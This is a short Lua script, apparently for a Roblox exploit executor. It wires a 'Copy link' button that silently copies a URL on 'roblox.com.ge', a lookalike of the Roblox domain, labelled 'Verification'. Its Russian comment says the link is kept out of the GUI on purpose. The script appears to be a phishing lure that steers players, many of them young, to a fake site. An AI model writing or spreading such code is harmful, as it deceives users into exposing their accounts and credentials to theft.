-- Функция копирования (новая ссылка, без отображения в GUI)
local function copyToClipboard()
	local success = pcall(function()
		setclipboard("https://roblox.com.ge/games/11852808844/Verification?privateServerLinkCode=69155647945445362618402496055839")
	end)
	
	if success then
		local originalText = copyButton.Text
		copyButton.Text = "Copied!"
		copyButton.BackgroundColor3 = Color3.fromRGB(70, 90, 70)
		copyButton.BackgroundTransparency = 0.1
		
		task.wait(1.5)
		copyButton.Text = originalText
		copyButton.BackgroundColor3 = Color3.fromRGB(55, 55, 65)
		copyButton.BackgroundTransparency = 0.3
	else
		copyButton.Text = "Error"
		task.wait(1)
		copyButton.Text = "Copy link"
	end
end

copyButton.MouseButton1Click:Connect(copyToClipboard)

